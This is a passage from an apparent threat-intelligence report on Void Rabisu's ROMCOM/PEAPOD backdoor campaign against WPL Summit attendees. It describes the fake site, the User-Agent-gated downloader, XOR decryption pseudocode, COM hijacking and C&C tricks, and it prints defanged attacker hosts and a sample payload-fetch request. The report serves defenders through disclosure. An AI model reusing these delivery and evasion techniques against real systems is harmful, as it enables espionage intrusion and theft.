Among](https://www.trendmicro.com/en_us/research/23/e/void-rabisu-s-use-of-romcom-backdoor-shows-a-growing-shift-in-th.html)\nthe threat actor’s previous targets were the Ukrainian government and military, their\nenergy and water utility sectors, EU politicians, spokespersons of a certain EU\ngovernment, and security conference participants. In campaigns conducted in late June\nand early August 2023, Void Rabisu targeted EU military personnel and political leaders\nworking on gender equality initiatives. Among the notable tools used by Void Rabisu is\nthe ROMCOM backdoor, of which it seems to be the exclusive user. ROMCOM itself has\ngone through various developments over time, including the implementation of more\neffective detection evasion techniques.\n\nVoid Rabisu is one of the clearest examples where we see a mix of the typical tactics,\ntechniques, and procedures (TTPs) used by cybercriminal threat actors and TTPs used\nby nation-state-sponsored threat actors motivated primarily by espionage goals. For\nexample, Void Rabisu has been signing malware with certificates most likely bought\nfrom a third-party service provider that other cybercriminal groups are also using. The\nthreat actor has also employed malicious advertisements on both Google and Bing to\ngenerate search engine traffic to their lure sites, which contain malicious copies of\nsoftware often used by system administrators.\n\nVoid Rabisu also acts like an advanced persistent threat (APT) actor when it targets\n[governments and military. In June 2023, Void Rabisu exploited the vulnerability CVE-](https://success.trendmicro.com/dcx/s/solution/000294111)\n[2023-36884 — still a zero-day vulnerability then — in campaigns using the Ukrainian](https://success.trendmicro.com/dcx/s/solution/000294111)\nWorld Congress and the July 2023 NATO summit as lures. The extraordinary\ngeopolitical circumstances surrounding the war in Ukraine drives some of the financialseeking threat actors (including Void Rabisu) toward campaigns motivated by\nespionage.\n\n\n-----\n\n[As reported by Microsoft, Void Rabisu used a zero-day vulnerability related to CVE-](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-36884)\n[2023-36884 in attacks targeting governments at the end of June 2023. Trend Micro’s](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-36884)\ntelemetry further confirms that this campaign targeted the military, government\npersonnel, and politicians in Europe.\n\nThe payload spread by Void Rabisu during this period differed from the ROMCOM\n[backdoor we analyzed in an earlier blog entry, but the two have clear similarities. This](https://www.trendmicro.com/en_nl/research/23/e/void-rabisu-s-use-of-romcom-backdoor-shows-a-growing-shift-in-th.html.)\nindicates that the threat actors are actively developing the ROMCOM backdoor.\n\nThe next iteration of the malware was used in early August 2023. On or around Aug. 8,\n2023, Void Rabisu set up a malicious copy of the official website of the Women Political\nLeaders (WPL) Summit that was held in Brussels from June 7 to 8, 2023. The final\npayload was a new version of ROMCOM backdoor that we have dubbed as “ROMCOM\n[4.0” (also known as PEAPOD).](https://twitter.com/r00tbsd/status/1679042069229191173)\n\nAttended by people from all over the world, the WPL summit aims to improve gender\nequality in politics. Among the topics included in the 2023 Brussels conference were\npeace and security, war and oppression, disinformation, the war in Ukraine, the role of\nwomen in politics, and gender equality. Since many current and future political leaders\nhad attended this conference, it presented an interesting target for espionage\ncampaigns and served as a possible avenue for threat actors to gain an initial foothold in\npolitical organizations. It is therefore not surprising that Void Rabisu set up a campaign\ntargeting WPL Summit 2023 attendees. Our telemetry provided concrete evidence that\nthis campaign was aimed at targets working on gender equality in EU politics.\n\nIn some of its latest campaigns, Void Rabisu started using a new technique that has not\npreviously been reported on. It involves a TLS-enforcing technique by the ROMCOM\ncommand-and-control (C&C) servers that can render the automated discovery of\nROMCOM infrastructure more difficult. We observed Void Rabisu using this technique in\na May 2023 ROMCOM campaign that spread a malicious copy of the legitimate\nPaperCut software, in which the C&C server ignored requests that were not conformant.\n\nThis report provides a general background on Void Rabisu and its activities with regard\nto the recent WPL Summit campaign. We begin by describing how Void Rabisu targeted\nWPL Summit attendees in the following section.\n\n## The fake WPL Summit 2023 page\n\nOn Aug. 8, 2023, Void Rabisu actors set up a website called wplsummit[.]com to attract\nvisitors of the legitimate wplsummit.org domain. The fake website (shown in Figure 1)\nlooked exactly like the legitimate one.\n\n\n-----\n\nFigure 1. WPL Summit 2023 fake website\n\nWhile the “Videos & photos” link of the legitimate domain redirects visitors to a Google\nDrive folder containing photographs from the event, the wplsummit[.]com fake website\ndirected visitors to a OneDrive folder containing two compressed files and an executable\ncalled Unpublished Pictures 1-20230802T122531-002-sfx.exe. The latter file appears to\nbe a piece of malware, the binary of which we analyze in the next section.\n\nFigure 2. The OneDrive folder containing WPL Summit 2023 pictures and a malware\ndownloader\n\n## Malware analysis\n\n User-Agent-Based downloader\n\nThe executable downloaded from the OneDrive folder is signed by a company called\nElbor LLC (which was previously used to sign multiple malicious files) with a valid\ncertificate. When executed, it pretends to be a self-extracting (SFX) archive and extracts\n56 pictures from its resource section to a folder when the user selects the “Extract”\nbutton:\n\n\n-----\n\nFigure 3. Fake window shown by the malware downloader\n\n\n-----\n\nFigure 4. Pictures dropped by the malware downloader from the event (gathered by the\nthreat actor from various social media postings)\n\nThe extracted photos were sourced by the malicious actor from individual posts on\nvarious social media platforms such as LinkedIn, X (formerly known as Twitter), and\nInstagram. While the victim is distracted with the pictures, the malware sends an HTTP\nGET request to https://mctelemetryzone[.]com/favicon.ico. The HTTP User-Agent string\nis checked on the server side, and if it matches the following string, a 122-KB file is\ndownloaded:+\n\n“Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36\n_(KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edge/44.18363.8131”_\n\nThe file is an XOR-encrypted PE file:\n\n\n-----\n\nFigure 5. XOR-encrypted, second stage payload\n\nThe downloaded file can be decrypted with the following pseudocode:\n\n_for (i=0; i<len; i++)_\n_data[i] = data[i] ^ 0xf0 * i_\n\nThe decrypted file is a 64-bit DLL that exports a CPLInit() function. The first stage\ndownloader then loads this DLL to memory and calls this function. It’s important to\nhighlight that this DLL never touches the disk. In other words, its download, decryption,\nand execution routines all happen in runtime in memory.\n\n## Payload setup\n\nThe DLL that runs from memory is internally called trymenow.dll. It reaches out to the\nlegitimate online service worldtimeapi.org to obtain a unique timestamp for the current\ndate and time in Unix Epoch format. This is later used to seed a calculation algorithm\nthat generates the URL path for the next request.\n\nThe path matches the regular expression [12]/[0-9]{9}, where the first part before the\nslash represents what component the downloader is requesting. The next part after the\nslash is possibly an identifier, as it is consistent between requests. The URL is encoded\nusing the Base64 format before the request is sent to redditanalytics[.]\n\n_pm in order to download the third stage component. The following is a sample request:_\n\n_GET https://redditanalytics.pm/Mi8xMzI0NTY3ODk=_\n_Accept:      */*_\n_UA-CPU:      AMD64_\n_Accept-Encoding: gzip, deflate_\n_User-Agent:    Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X)_\n_AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 EdgiOS/114.1823.67_\n\n\n-----\n\n_Mobile/15E148 Safari/605.1.15_\n_Host:       redditanalytics.pm_\n_Connection:    Keep-Alive_\n\nOn the server side, the URL path is decoded. If everything is correct, the server replies\nwith another XOR-encrypted file that will be decrypted and stored at\n_%PUBLIC%\\AccountPictures\\Defender\\Security.dll, which is the DLL used for COM_\nhijacking. This time, Void Rabisu chose to hijack CLSID {F5078F32-C551-11D3-89B9_0000F81FE221}, which is used by the WordPad application_\n\nThe next step involves reaching out to worldtimeapi.org again to get an updated\ntimestamp and download another component from redditanalytics[.]pm, which is the\ncomponent that talks to the C&C server netstaticsinformation[.]com. (This is the network\ncomponent from our previous blog entry.)\n\nAfter both payloads are downloaded, WordPad is launched, causing the first payload to\nexecute via COM hijacking.\n\n## C&C server communication\n\nThe PEAPOD samples we analyzed force WinHTTP functions to use TLS 1.2 instead of\nthe default version chosen by the operating system. A C&C server for a previous\ncampaign using the legitimate PaperCut software as a lure checked the TLS version of a\nclient HTTP request and would not respond with a payload if the request was not\nconformant. However, the C&C server for the campaign targeting WPL Summit 2023\nattendees responded as expected, regardless of the TLS version negotiation used to\ninitiate the communication.\n\nThe malware first prepares the right flag for later use with WinHttpSetOption().\nAfterward, it creates an HTTP session using Microsoft Edge 1.0 as the User-Agent\nstring. However, before anything is sent to the server, the connection is set to use TLS\n1.2.\n\nWe checked how different Windows versions treat SSL/TLS usage, which we summarize\nin the following table:\n\n**Operating** **TLS version**\n**System** **WinHTTP flag** **used**\n\nWindows 11 WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 1.2\n\nWindows 11 (not set / default) 1.3\n\nWindows 10 WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 1.2\n\nWindows 10 (not set / default) 1.2\n\n|Operating System|WinHTTP flag|TLS version used|\n|---|---|---|\n|Windows 11|WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2|1.2|\n|Windows 11|(not set / default)|1.3|\n|Windows 10|WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2|1.2|\n\n\n-----\n\n|Windows 7|WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2|An error occurs|\n|---|---|---|\n|Windows 7|(not set / default)|1|\n\n\nTable 1. A summary of how Windows versions treat SSL/TLS usage\n\nBased on the table, we believe that PEAPOD cannot infect systems running Windows 7\nand earlier versions. Why Void Rabisu uses this flag is still an open question, but it is\npossible that it wanted to implement some form of checking on the C&C server side to\nmake C&C fingerprinting harder.\n\nBefore sending the POST request by calling WinHttpSendRequest(), additional flags are\nset to ignore all certificate errors. An empty request is sent, followed by a request\ncontaining a command to let the C&C server know about the victim.\n\nFigure 6. Additional flags are set to ignore all certificate errors\n\nIf the malware cannot reach out to the C&C server using HTTPS, it tries to connect via\nraw TCP (Transmission Control Protocol) at port 442 or ICMP (Internet Control Message\nProtocol).\n\n## Comparing ROMCOM 3.0 and PEAPOD\n\n[Thanks to Volexity researchers who shared a previous PEAPOD sample with us, we](https://twitter.com/r00tbsd/status/1679042069229191173)\nwere able to confirm that Void Rabisu seems to have temporarily stopped using\nROMCOM 3.0 and have begun delivering PEAPOD, which has some architectural\ndifferences compared to ROMCOM 3.0. We highlight these differences in the following\ntable:\n\n\n-----\n\n|Capability|ROMCOM 3.0|PEAPOD|\n|---|---|---|\n|Dropper|Modified installation program (MSI or EXE) that drops the other components|EXE downloads XOR-encrypted DLL, which downloads the other components|\n|Core malware modularity|Three components: COM hijacking (loader), worker, and network|Three components observed: COM hijacking (loader), worker (stored in Windows Registry) and network. Most of them loaded from memory.|\n|Components Inter- process communication (IPC)|Localhost sockets|Named pipes|\n|Commands|42 commands handled by the worker component|10 commands in total. The network component handles 7 of them directly and forwards the other 3 to the worker component.|\n\n\nTable 2. Key differences between ROMCOM 3.0 and PEAPOD\n\nWe summarize the commands supported by PEAPOD in the following table:\n\n|Command|Description|Details|\n|---|---|---|\n|0|No action|The function that handles the commands will return zero and the malware will wait for the next command|\n|1|Run command|Executes a command and sends back its output|\n|2|Uploads file|Uploads a file to the infected machine|\n|3|Downloads file|Downloads a file from the infected machine|\n|4|Run command|Executes a command|\n|5|Updates the interval the backdoor and checks for new activity (default to 60 seconds)|The new interval received is sent to security.dll via the named pipe and security.dll then writes it to registry|\n\n\n-----\n\n|6|Gets system info|Retrieves RAM, processor info, local time, and username|\n|---|---|---|\n|7|Updates the network component|The data for the new version of the network component is written to a named pipe, which is read by the loader (security.dll) and updated in the Windows registry|\n|8|Uninstalls PEAPOD|Registry keys are cleaned, and all files are deleted|\n|9|Gets the service name|Returns the service DisplayName from registry|\n\n\nTable 3. Commands supported by PEAPOD\n\nBy using the commands listed in Table 3, it is still possible for systems infected by\nPEAPOD to download a third component that is more like the ROMCOM 3.0 worker,\nwhich would allow the threat actors to have the same level of control over the victims\nthat they targeted with ROMCOM 3.0. However, machines we infected in our lab did not\ndownload any additional components.\n\nConclusions and outlook\n\nAlmost a year after Void Rabisu shifted its targeting from opportunistic ransomware\nattacks with an emphasis on cyberespionage, the threat actor is still developing its main\nmalware, the ROMCOM backdoor. The backdoor being stripped down to its core, with\nadditional components being downloaded as needed, provides Void Rabisu the choice\nof loading additional components for specific targets. From the attacker’s perspective,\nthis has the advantage of less exposure for the additional components, making it more\ndifficult to collect for malware researchers.\n\nSome of Void Rabisu’s campaigns very narrowly target politicians, government\nemployees, and the military. This means that Void Rabisu has branched out into an area\nthat is usually covered by APT groups typically thought to be nation-state-sponsored.\n\nWhile we have no evidence that Void Rabisu is nation-state-sponsored, it’s possible that\nit is one of the financially motivated threat actors from the criminal underground that got\npulled into cyberespionage activities due to the extraordinary geopolitical circumstances\ncaused by the war in Ukraine.\n\nVoid Rabisu has targeted participants of at least three conferences in 2023, namely the\nMunich Security Conference, the Masters of Digital conference, and the WPL Summit. It\nis possible, and even expected, that other conferences and special interest groups will\n\n\n-----\n\nbe targeted by Void Rabisu in the future. We will keep paying close attention to Void\nRabisu’s TTPs and report on new campaigns as we find them.\n\n## Indicators of Compromise (IOCs)\n\n[The indicators of compromise for this entry can be found in this link.](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/23/j/void-rabisu-targets-female-political-leaders/ioc-void-rabisu-targets-female-political-leaders-with-new-slimmed-down-ROMCOM-variant.txt)\n\n_With additional contribution from Lord Remorin_\nTags\n\nThis website uses cookies for website functionality, traffic analytics, personalization,\nsocial media functionality and advertising.
